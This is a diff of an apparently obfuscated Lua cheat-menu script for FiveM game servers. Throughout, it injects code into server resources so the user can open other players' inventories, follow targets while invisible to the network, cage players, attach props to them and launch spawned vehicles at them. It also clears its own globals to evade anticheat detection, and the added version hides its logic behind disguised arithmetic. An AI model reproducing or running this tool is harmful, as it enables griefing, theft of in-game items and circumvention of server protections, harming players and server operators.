+        ]]);v15=false;MachoMenuNotification("Follow","Follow left and returned.");return;end v346=tonumber(MachoMenuGetInputbox(v118));if ( not v346 or (v346<=(0 -0))) then MachoMenuNotification("Error","Please enter a valid ID!");return;end v345=774 -(48 + 725) ;end if (v345==4) then v15=true;AttachEntityToEntity(v348,v349,19302 -7486 ,0.5 -0 , -2,2 + 0 ,0 -0 ,0 + 0 ,0 + 0 ,false,false,false,false,854 -(152 + 701) ,true);CreateThread(function() while v109 do local v831=1311 -(430 + 881) ;while true do if (v831==1) then if v15 then local v957=0;local v958;while true do if (v957==(0 + 0)) then v958=PlayerPedId();SetEntityVisible(v958,false,false);v957=896 -(557 + 338) ;end if (v957==(1 + 1)) then SetEntityLocallyVisible(v958);SetEntityAlpha(v958,718 -463 ,false);break;end if (v957==1) then NetworkSetEntityInvisibleToNetwork(v958,true);SetEntityAlpha(v958,0,false);v957=6 -4 ;end end end break;end if (v831==0) then Wait(13 -8 );if IsPauseMenuActive() then v109=false;DetachEntity(v348,true,false);v117(false);if DoesEntityExist(v111) then ClearPedTasks(v111);end if v113 then SetEntityCoords(v348,v113.x,v113.y,v113.z,false,false,false,false);end v111=nil;MachoMenuNotification("Follow","Follow ended, returned to position.");end v831=2 -1 ;end end end end);break;end if (v345==1) then v347=GetPlayerFromServerId(v346);if (v347== -(802 -(499 + 302))) then MachoMenuNotification("Error","Player not found.");return;end v348=PlayerPedId();v345=868 -(39 + 827) ;end if ((5 -3)==v345) then v349=GetPlayerPed(v347);if  not DoesEntityExist(v349) then local v832=0 -0 ;while true do if ((0 -0)==v832) then MachoMenuNotification("Error","Target ped doesn't exist.");return;end end end v109=true;v345=3 -0 ;end end end);MachoMenuButton(v91,"Follow and Open Inventory / Leave",function() if v108 then local v550=PlayerPedId();v108=false;DetachEntity(v550,true,false);v117(false);if DoesEntityExist(v110) then ClearPedTasks(v110);end v110=nil;if v113 then SetEntityCoords(v550,v113.x,v113.y,v113.z,false,false,false,false);end SetEntityVisible(v550,true,false);NetworkSetEntityInvisibleToNetwork(v550,false);ResetEntityAlpha(v550);v116=false;MachoMenuNotification("Follow","Follow left and returned.");return;end local v350=tonumber(MachoMenuGetInputbox(v118));if ( not v350 or (v350<=(0 + 0))) then MachoMenuNotification("Error","Please enter a valid ID!");return;end local v351=GetPlayerFromServerId(v350);if (v351== -(2 -1)) then MachoMenuNotification("Error","Player not found.");return;end local v352=PlayerPedId();local v353=GetPlayerPed(v351);if  not DoesEntityExist(v353) then local v551=0 + 0 ;while true do if (v551==0) then MachoMenuNotification("Error","Target ped doesn't exist.");return;end end end v108=true;v110=v353;v113=GetEntityCoords(v352);SetEntityVisible(v352,false,false);NetworkSetEntityInvisibleToNetwork(v352,true);SetEntityAlpha(v352,0,false);v116=true;AttachEntityToEntity(v352,v353,11816,0.5 -0 ,104 -(103 + 1) ,554 -(475 + 79) ,0,0 -0 ,0,false,false,false,false,6 -4 ,true);local v354,v355="missminuteman_1ig_2","handsup_base";RequestAnimDict(v354);while  not HasAnimDictLoaded(v354) do Wait(0 + 0 );end TaskPlayAnim(v353,v354,v355,8 + 0 , -8, -1,1552 -(1395 + 108) ,0 -0 ,false,false,false);CreateThread(function() while v108 do Wait(5);if IsPauseMenuActive() then v108=false;DetachEntity(v352,true,false);v117(false);if DoesEntityExist(v110) then ClearPedTasks(v110);end if v113 then SetEntityCoords(v352,v113.x,v113.y,v113.z,false,false,false,false);end v110=nil;v116=false;MachoMenuNotification("Follow","Follow ended, returned to position.");end if v116 then local v782=PlayerPedId();SetEntityVisible(v782,false,false);NetworkSetEntityInvisibleToNetwork(v782,true);SetEntityAlpha(v782,1204 -(7 + 1197) ,false);SetEntityLocallyVisible(v782);SetEntityAlpha(v782,112 + 143 ,false);end end end);TriggerEvent("ox_inventory:openInventory","otherplayer",v350);end);MachoMenuButton(v91,"Open Nearby Player's Inventory (OX)",function() MachoInjectResource("m3-inventory",[[
         local function GetClosestPlayer()
             local closestPlayer = -1
             local closestDistance = -1
@@ -4256,12 +1613,7 @@ MachoMenuButton(PlayerManipSection, "Open Nearby Player's Inventory (OX)", funct
         else
             TriggerEvent('chat:addMessage', { args = { '^1Inventory:', 'No nearby player found!' } })
         end
-    ]])
-end)
-
--- Open Nearby Player's Inventory (QB Version - instant like OX)
-MachoMenuButton(PlayerManipSection, "Open Nearby Player's Inventory (QB)", function()
-    MachoInjectResource('monitor', [[
+    ]]);end);MachoMenuButton(v91,"Open Nearby Player's Inventory (QB)",function() MachoInjectResource("monitor",[[
         local function GetClosestPlayer()
             local closestPlayer = -1
             local closestDistance = -1
@@ -4300,54 +1652,13 @@ MachoMenuButton(PlayerManipSection, "Open Nearby Player's Inventory (QB)", funct
             AddTextComponentString("~r~No nearby player found!")
             DrawNotification(false, false)
         end
-    ]])
-end)
-
--- Open Specific Player's Inventory (QB) - with ID input
-local QBPlayerIDInput = MachoMenuInputbox(PlayerManipSection, "QB Player ID to Open", "e.g., 123")
-MachoMenuButton(PlayerManipSection, "Open QB Player Inventory (By ID)", function()
-    local playerId = MachoMenuGetInputbox(QBPlayerIDInput)
-    
-    if playerId and playerId ~= '' then
-        local targetId = tonumber(playerId)
-        if targetId and targetId > 0 then
-            MachoInjectResource('monitor', string.format([[
+    ]]);end);local v119=MachoMenuInputbox(v91,"QB Player ID to Open","e.g., 123");MachoMenuButton(v91,"Open QB Player Inventory (By ID)",function() local v356=MachoMenuGetInputbox(v119);if (v356 and (v356~="")) then local v552=0 + 0 ;local v553;while true do if (v552==(319 -(27 + 292))) then v553=tonumber(v356);if (v553 and (v553>0)) then local v929=0 -0 ;while true do if (v929==(0 -0)) then MachoInjectResource("monitor",string.format([[
                 TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", %d)
                 
                 SetNotificationTextEntry("STRING")
                 AddTextComponentString("~g~Opened inventory for player ID: ~b~" .. %d)
                 DrawNotification(false, false)
-            ]], targetId, targetId))
-            MachoMenuNotification("QB Inventory", "Opening inventory for player ID: " .. targetId)
-        else
-            MachoMenuNotification("Error", "Please enter a valid player ID!")
-        end
-    else
-        MachoMenuNotification("Error", "Please enter a player ID!")
-    end
-end)
-
--- ============================================================
--- S1 ATTACH JET (Selected Player)
--- ============================================================
-
-local AttachJetInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Attach Jet)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "S1 Attach Jet", function()
-    local targetId = tonumber(MachoMenuGetInputbox(AttachJetInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Attach Jet", "Attaching jet to ID: " .. targetId)
-        
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'ox_inventory'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+            ]],v553,v553));MachoMenuNotification("QB Inventory","Opening inventory for player ID: "   .. v553 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end else MachoMenuNotification("Error","Please enter a player ID!");end end);local v120=MachoMenuInputbox(v91,"Target Player ID (Attach Jet)","e.g., 123");MachoMenuButton(v91,"S1 Attach Jet",function() local v357=tonumber(MachoMenuGetInputbox(v120));if (v357 and (v357>(0 -0))) then local v554=0;local v555;while true do if (v554==0) then MachoMenuNotification("Attach Jet","Attaching jet to ID: "   .. v357 );v555=nil;v554=1 -0 ;end if (v554==1) then if (GetResourceState("monitor")=="started") then v555="monitor";elseif (GetResourceState("qb-core")=="started") then v555="qb-core";else v555="ox_inventory";end MachoInjectResource2(NewThreadNs,v555,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -4406,33 +1717,7 @@ MachoMenuButton(PlayerManipSection, "S1 Attach Jet", function()
                 print("Attach Jet: Failed to load model!")
                 TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'Failed to load object model!' } })
             end
-        ]], targetId))
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- ============================================================
--- S1 ATTACH BOX (Selected Player)
--- ============================================================
-
-local AttachBoxInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Attach Box)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "S1 Attach Box", function()
-    local targetId = tonumber(MachoMenuGetInputbox(AttachBoxInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Attach Box", "Attaching box to ID: " .. targetId)
-        
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'ox_inventory'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+        ]],v357));break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v121=MachoMenuInputbox(v91,"Target Player ID (Attach Box)","e.g., 123");MachoMenuButton(v91,"S1 Attach Box",function() local v358=tonumber(MachoMenuGetInputbox(v121));if (v358 and (v358>(0 -0))) then MachoMenuNotification("Attach Box","Attaching box to ID: "   .. v358 );local v556=nil;if (GetResourceState("monitor")=="started") then v556="monitor";elseif (GetResourceState("qb-core")=="started") then v556="qb-core";else v556="ox_inventory";end MachoInjectResource2(NewThreadNs,v556,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -4491,33 +1776,7 @@ MachoMenuButton(PlayerManipSection, "S1 Attach Box", function()
                 print("Attach Box: Failed to load model!")
                 TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'Failed to load object model!' } })
             end
-        ]], targetId))
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- ============================================================
--- S1 ATTACH CONE (Selected Player)
--- ============================================================
-
-local AttachConeInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Attach Cone)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "S1 Attach Cone", function()
-    local targetId = tonumber(MachoMenuGetInputbox(AttachConeInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Attach Cone", "Attaching cone to ID: " .. targetId)
-        
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'ox_inventory'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+        ]],v358));else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v122=MachoMenuInputbox(v91,"Target Player ID (Attach Cone)","e.g., 123");MachoMenuButton(v91,"S1 Attach Cone",function() local v359=139 -(43 + 96) ;local v360;while true do if ((0 -0)==v359) then v360=tonumber(MachoMenuGetInputbox(v122));if (v360 and (v360>0)) then local v833=0 -0 ;local v834;while true do if (v833==1) then if (GetResourceState("monitor")=="started") then v834="monitor";elseif (GetResourceState("qb-core")=="started") then v834="qb-core";else v834="ox_inventory";end MachoInjectResource2(NewThreadNs,v834,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -4576,33 +1835,7 @@ MachoMenuButton(PlayerManipSection, "S1 Attach Cone", function()
                 print("Attach Cone: Failed to load model!")
                 TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'Failed to load object model!' } })
             end
-        ]], targetId))
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- ============================================================
--- S1 ATTACH JUKE BOX (Selected Player)
--- ============================================================
-
-local AttachJukeInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Attach Juke)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "S1 Attach Juke Box", function()
-    local targetId = tonumber(MachoMenuGetInputbox(AttachJukeInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Attach Juke", "Attaching juke box to ID: " .. targetId)
-        
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'ox_inventory'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+        ]],v360));break;end if (v833==0) then MachoMenuNotification("Attach Cone","Attaching cone to ID: "   .. v360 );v834=nil;v833=1 + 0 ;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v123=MachoMenuInputbox(v91,"Target Player ID (Attach Juke)","e.g., 123");MachoMenuButton(v91,"S1 Attach Juke Box",function() local v361=0;local v362;while true do if (v361==0) then v362=tonumber(MachoMenuGetInputbox(v123));if (v362 and (v362>(0 + 0))) then MachoMenuNotification("Attach Juke","Attaching juke box to ID: "   .. v362 );local v835=nil;if (GetResourceState("monitor")=="started") then v835="monitor";elseif (GetResourceState("qb-core")=="started") then v835="qb-core";else v835="ox_inventory";end MachoInjectResource2(NewThreadNs,v835,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -4661,88 +1894,7 @@ MachoMenuButton(PlayerManipSection, "S1 Attach Juke Box", function()
                 print("Attach Juke: Failed to load model!")
                 TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'Failed to load object model!' } })
             end
-        ]], targetId))
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- Cage Player function
-function CagePlayer(player)
-    local ped = GetPlayerPed(player)
-    if not ped or ped <= 0 then 
-        MachoMenuNotification("Error!", "Invalid player ped.")
-        return 
-    end
-
-    local coords = GetEntityCoords(ped)
-    if not coords then 
-        MachoMenuNotification("Error!", "Could not get player coordinates.")
-        return 
-    end
-
-    local inveh = IsPedInAnyVehicle(ped)
-
-    if inveh then
-        -- Cage created while in vehicle
-        local obj = CreateObject(GetHashKey("prop_metal_detector"), coords.x - 6.8, coords.y + 1, coords.z - 1.5, false, true, true)
-        SetEntityHeading(obj, 90.0)
-        
-        CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z - 1.5, false, true, true)
-        
-        CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z - 1.5, false, true, true)
-
-        local obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z - 1.5, false, true, true)
-        SetEntityHeading(obj2, 90.0)
-        
-        obj = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 6.8, coords.y + 1, coords.z + 1.3, false, true, true)
-        SetEntityHeading(obj, 90.0)
-        
-        CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z + 1.3, false, true, true)
-        
-        CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z + 1.3, false, true, true)
-
-        obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z + 1.3, false, true, true)
-        SetEntityHeading(obj2, 90.0)
-    else
-        -- Cage created outside vehicle
-        local obj = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z - 1, true, true, true)
-        FreezeEntityPosition(obj, true)
-        
-        local obj2 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z - 1, true, true, true)
-        SetEntityHeading(obj2, 90.0)
-        FreezeEntityPosition(obj2, true)
-        
-        local obj3 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z - 1, true, true, true)
-        FreezeEntityPosition(obj3, true)
-        
-        local obj4 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z - 1, true, true, true)
-        SetEntityHeading(obj4, 90.0)
-        FreezeEntityPosition(obj4, true)
-        
-        local obj5 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z + 1.5, true, true, true)
-        FreezeEntityPosition(obj5, true)
-        
-        local obj6 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z + 1.5, true, true, true)
-        SetEntityHeading(obj6, 90.0)
-        FreezeEntityPosition(obj6, true)
-        
-        local obj7 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z + 1.5, true, true, true)
-        FreezeEntityPosition(obj7, true)
-        
-        local obj8 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z + 1.5, true, true, true)
-        SetEntityHeading(obj8, 90.0)
-        FreezeEntityPosition(obj8, true)
-    end
-end
-
--- MachoMenu Button and Input Box
-local CageTargetIdInputBoxHandle = MachoMenuInputbox(VehicleNPCSection, "Cage Target Player ID", "e.g., 123")
-
-MachoMenuButton(VehicleNPCSection, "Cage Player", function()
-    local targetId = tonumber(MachoMenuGetInputbox(CageTargetIdInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoInjectResource('monitor', string.format([[
+        ]],v362));else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);function CagePlayer(v363) local v364=GetPlayerPed(v363);if ( not v364 or (v364<=(0 -0))) then local v557=0 + 0 ;while true do if (v557==0) then MachoMenuNotification("Error!","Invalid player ped.");return;end end end local v365=GetEntityCoords(v364);if  not v365 then MachoMenuNotification("Error!","Could not get player coordinates.");return;end local v366=IsPedInAnyVehicle(v364);if v366 then local v558=0 -0 ;local v559;local v560;while true do if (v558==(1 + 2)) then CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x-(0.6 + 0) ,v365.y-4.8 ,v365.z + (1752.3 -(1414 + 337)) ,false,true,true);v560=CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x + (1944.8 -(1642 + 298)) ,v365.y + (2 -1) ,v365.z + (2.3 -1) ,false,true,true);SetEntityHeading(v560,267 -177 );break;end if (v558==0) then v559=CreateObject(GetHashKey("prop_metal_detector"),v365.x-(2.8 + 4) ,v365.y + 1 + 0 ,v365.z-1.5 ,false,true,true);SetEntityHeading(v559,1062 -(357 + 615) );CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x-0.6 ,v365.y + 6.8 ,v365.z-(1.5 + 0) ,false,true,true);v558=2 -1 ;end if (v558==1) then CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x-0.6 ,v365.y-(4.8 + 0) ,v365.z-(2.5 -1) ,false,true,true);v560=CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x + 4.8 + 0 ,v365.y + 1 ,v365.z-(1.5 + 0) ,false,true,true);SetEntityHeading(v560,90);v558=2 + 0 ;end if (v558==(1303 -(384 + 917))) then v559=CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x-(703.8 -(128 + 569)) ,v365.y + (1544 -(1407 + 136)) ,v365.z + (1888.3 -(687 + 1200)) ,false,true,true);SetEntityHeading(v559,90);CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x-(1710.6 -(556 + 1154)) ,v365.y + (20.8 -14) ,v365.z + 1.3 ,false,true,true);v558=98 -(9 + 86) ;end end else local v561=421 -(275 + 146) ;local v562;local v563;local v564;local v565;local v566;local v567;local v568;local v569;while true do if (v561==6) then SetEntityHeading(v569,90);FreezeEntityPosition(v569,true);break;end if (v561==(1 + 2)) then FreezeEntityPosition(v565,true);v566=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-(64.6 -(29 + 35)) ,v365.y-(4 -3) ,v365.z + (2.5 -1) ,true,true,true);FreezeEntityPosition(v566,true);v561=4;end if (v561==(17 -13)) then v567=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-(0.55 + 0) ,v365.y-(1013.05 -(53 + 959)) ,v365.z + 1.5 ,true,true,true);SetEntityHeading(v567,90);FreezeEntityPosition(v567,true);v561=5;end if (v561==(408 -(312 + 96))) then v562=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-(0.6 -0) ,v365.y-1 ,v365.z-(286 -(147 + 138)) ,true,true,true);FreezeEntityPosition(v562,true);v563=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-(899.55 -(813 + 86)) ,v365.y-(1.05 + 0) ,v365.z-(1 -0) ,true,true,true);v561=1;end if (v561==(493 -(18 + 474))) then SetEntityHeading(v563,90);FreezeEntityPosition(v563,true);v564=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-(0.6 + 0) ,v365.y + 0.6 ,v365.z-(3 -2) ,true,true,true);v561=1088 -(860 + 226) ;end if (v561==5) then v568=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-0.6 ,v365.y + 0.6 ,v365.z + 1.5 ,true,true,true);FreezeEntityPosition(v568,true);v569=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x + 1.05 ,v365.y-1.05 ,v365.z + (304.5 -(121 + 182)) ,true,true,true);v561=6;end if (v561==(1 + 1)) then FreezeEntityPosition(v564,true);v565=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x + (1241.05 -(988 + 252)) ,v365.y-(1.05 + 0) ,v365.z-(1 + 0) ,true,true,true);SetEntityHeading(v565,2060 -(49 + 1921) );v561=893 -(223 + 667) ;end end end end local v124=MachoMenuInputbox(v90,"Cage Target Player ID","e.g., 123");MachoMenuButton(v90,"Cage Player",function() local v367=0;local v368;while true do if (v367==0) then v368=tonumber(MachoMenuGetInputbox(v124));if (v368 and (v368>(52 -(51 + 1)))) then local v836=0 -0 ;while true do if (v836==(0 -0)) then MachoInjectResource("monitor",string.format([[
             local targetClientId = GetPlayerFromServerId(%d)
             if targetClientId == -1 then
                 TriggerEvent('chat:addMessage', { args = { '^1Cage:', 'Player not found! ID: %d' } })
@@ -4795,66 +1947,7 @@ MachoMenuButton(VehicleNPCSection, "Cage Player", function()
                 FreezeEntityPosition(obj8, true)
             end
             TriggerEvent('chat:addMessage', { args = { '^2Cage:', 'Cage created! Player ID: %d' } })
-        ]], targetId, targetId, targetId, targetId, targetId))
-        MachoMenuNotification("Cage", "Cage created! Player ID: " .. targetId)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- Blackhole and Drafter spawn script: Vehicle spawn and launch or single drafter spawn
-local isBlackholeActive = false
-local targetPed = nil
-local vehicles = {}
-
--- Random vehicle model selection (for blackhole)
-local vehicleModels = {
-    "adder", "comet2", "elegy2", "banshee", "sultan"
-}
-
-local function GetRandomVehicleModel()
-    return vehicleModels[math.random(1, #vehicleModels)]
-end
-
--- Start Blackhole: Spawn 5 vehicles and launch
-local function StartBlackhole(targetPlayerId)
-    isBlackholeActive = true
-    targetPed = GetPlayerPed(GetPlayerFromServerId(targetPlayerId))
-    if not targetPed or not DoesEntityExist(targetPed) then
-        MachoMenuNotification("Error", "Player ID " .. targetPlayerId .. " not found!")
-        isBlackholeActive = false
-        return
-    end
-
-    local targetCoords = GetEntityCoords(targetPed)
-    vehicles = {}
-
-    -- Spawn 5 vehicles (limit for anticheat)
-    for i = 1, 5 do
-        local model = GetRandomVehicleModel()
-        local modelHash = GetHashKey(model)
-        RequestModel(modelHash)
-        while not HasModelLoaded(modelHash) do
-            Citizen.Wait(0)
-        end
-
-        local offsetX = math.random(-5, 5)
-        local offsetY = math.random(-5, 5)
-        local vehicle = CreateVehicle(modelHash, targetCoords.x + offsetX, targetCoords.y + offsetY, targetCoords.z, 0.0, true, true)
-        if DoesEntityExist(vehicle) then
-            NetworkRegisterEntityAsNetworked(vehicle)
-            local netId = NetworkGetNetworkIdFromEntity(vehicle)
-            SetNetworkIdCanMigrate(netId, true)
-            SetNetworkIdExistsOnAllMachines(netId, true)
-            table.insert(vehicles, vehicle)
-        end
-        SetModelAsNoLongerNeeded(modelHash)
-    end
-
-    MachoMenuNotification("Info", "Blackhole started, target ID: " .. targetPlayerId)
-
-    -- Inject blackhole logic to every client
-    MachoInjectResource('monitor', string.format([[
+        ]],v368,v368,v368,v368,v368));MachoMenuNotification("Cage","Cage created! Player ID: "   .. v368 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v125=false;local v126=nil;local v127={};local v128={"adder","comet2","elegy2","banshee","sultan"};local function v129() return v128[math.random(1 + 0 , #v128)];end local function v130(v369) local v370=0;local v371;while true do if (v370==(1443 -(496 + 947))) then v125=true;v126=GetPlayerPed(GetPlayerFromServerId(v369));v370=1359 -(1233 + 125) ;end if (v370==2) then v127={};for v783=1 + 0 ,5 + 0  do local v784=0 + 0 ;local v785;local v786;local v787;local v788;local v789;while true do if (v784==4) then SetModelAsNoLongerNeeded(v786);break;end if (v784==2) then v787=math.random( -5,1650 -(963 + 682) );v788=math.random( -(5 + 0),1509 -(504 + 1000) );v784=3 + 0 ;end if (v784==(3 + 0)) then v789=CreateVehicle(v786,v371.x + v787 ,v371.y + v788 ,v371.z,0 + 0 ,true,true);if DoesEntityExist(v789) then NetworkRegisterEntityAsNetworked(v789);local v955=NetworkGetNetworkIdFromEntity(v789);SetNetworkIdCanMigrate(v955,true);SetNetworkIdExistsOnAllMachines(v955,true);table.insert(v127,v789);end v784=5 -1 ;end if (v784==1) then RequestModel(v786);while  not HasModelLoaded(v786) do Citizen.Wait(0);end v784=2 + 0 ;end if ((0 + 0)==v784) then v785=v129();v786=GetHashKey(v785);v784=1;end end end v370=3;end if (v370==(183 -(156 + 26))) then if ( not v126 or  not DoesEntityExist(v126)) then MachoMenuNotification("Error","Player ID "   .. v369   .. " not found!" );v125=false;return;end v371=GetEntityCoords(v126);v370=2 + 0 ;end if (v370==(3 -0)) then MachoMenuNotification("Info","Blackhole started, target ID: "   .. v369 );MachoInjectResource("monitor",string.format([[
         _G.isBlackholeActive = true
         local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
         if not targetPed or not DoesEntityExist(targetPed) then
@@ -4899,31 +1992,9 @@ local function StartBlackhole(targetPlayerId)
                 Citizen.Wait(200)
             end
         end)
-    ]], targetPlayerId))
-end
-
--- Stop Blackhole
-local function StopBlackhole()
-    if not isBlackholeActive then
-        MachoMenuNotification("Error", "Blackhole is not active!")
-        return
-    end
-
-    isBlackholeActive = false
-    targetPed = nil
-    vehicles = {}
-    MachoMenuNotification("Info", "Blackhole stopped.")
-
-    -- Inject blackhole stop command to every client
-    MachoInjectResource('monitor', [[
+    ]],v369));break;end end end local function v131() if  not v125 then local v570=164 -(149 + 15) ;while true do if (v570==0) then MachoMenuNotification("Error","Blackhole is not active!");return;end end end v125=false;v126=nil;v127={};MachoMenuNotification("Info","Blackhole stopped.");MachoInjectResource("monitor",[[
         _G.isBlackholeActive = false
-    ]])
-end
-
--- Spawn single drafter vehicle
-local function SpawnDrafter(targetPlayerId)
-    -- Inject vehicle spawn to local client
-    MachoInjectResource('monitor', string.format([[
+    ]]);end local function v132(v372) local v373=960 -(890 + 70) ;while true do if (v373==(117 -(39 + 78))) then MachoInjectResource("monitor",string.format([[
         local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
         if not targetPed or not DoesEntityExist(targetPed) then
             TriggerEvent('chat:addMessage', { args = { '^1Error:', 'Player not found! ID: %d' } })
@@ -4947,87 +2018,7 @@ local function SpawnDrafter(targetPlayerId)
             TriggerEvent('chat:addMessage', { args = { '^2Info:', 'Drafter vehicle spawned, target ID: %d' } })
         end
         SetModelAsNoLongerNeeded(modelHash)
-    ]], targetPlayerId, targetPlayerId, targetPlayerId))
-
-    MachoMenuNotification("Info", "Drafter vehicle spawned, target ID: " .. targetPlayerId)
-end
-
--- MachoMenu Integration
-local TargetIdInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "Start Blackhole", function()
-    if isBlackholeActive then
-        MachoMenuNotification("Error", "Blackhole is already active! Stop it first.")
-        return
-    end
-    local targetId = tonumber(MachoMenuGetInputbox(TargetIdInputBoxHandle))
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-        return
-    end
-    local targetClientId = GetPlayerFromServerId(targetId)
-    if targetClientId == -1 then
-        MachoMenuNotification("Error", "Player not found! ID: " .. targetId)
-        return
-    end
-    local ped = GetPlayerPed(targetClientId)
-    if not ped or ped <= 0 then
-        MachoMenuNotification("Error", "Invalid player ped! ID: " .. targetId)
-        return
-    end
-    StartBlackhole(targetId)
-end)
-
-MachoMenuButton(PlayerManipSection, "Stop Blackhole", function()
-    StopBlackhole()
-end)
-
-MachoMenuButton(PlayerManipSection, "Spawn Vehicle", function()
-    local targetId = tonumber(MachoMenuGetInputbox(TargetIdInputBoxHandle))
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-        return
-    end
-    local targetClientId = GetPlayerFromServerId(targetId)
-    if targetClientId == -1 then
-        MachoMenuNotification("Error", "Player not found! ID: " .. targetId)
-        return
-    end
-    local ped = GetPlayerPed(targetClientId)
-    if not ped or ped <= 0 then
-        MachoMenuNotification("Error", "Invalid player ped! ID: " .. targetId)
-        return
-    end
-    SpawnDrafter(targetId)
-end)
-
--- Global environment cleanup (for anticheat detection)
-local function Cleanup()
-    _G["GetRandomVehicleModel"] = nil
-    _G["StartBlackhole"] = nil
-    _G["StopBlackhole"] = nil
-    _G["SpawnDrafter"] = nil
-    _G["isBlackholeActive"] = nil
-    _G["targetPed"] = nil
-    _G["vehicles"] = nil
-end
-
-Citizen.CreateThread(function()
-    Citizen.Wait(1000) -- Cleanup after script loads
-    Cleanup()
-end)
-
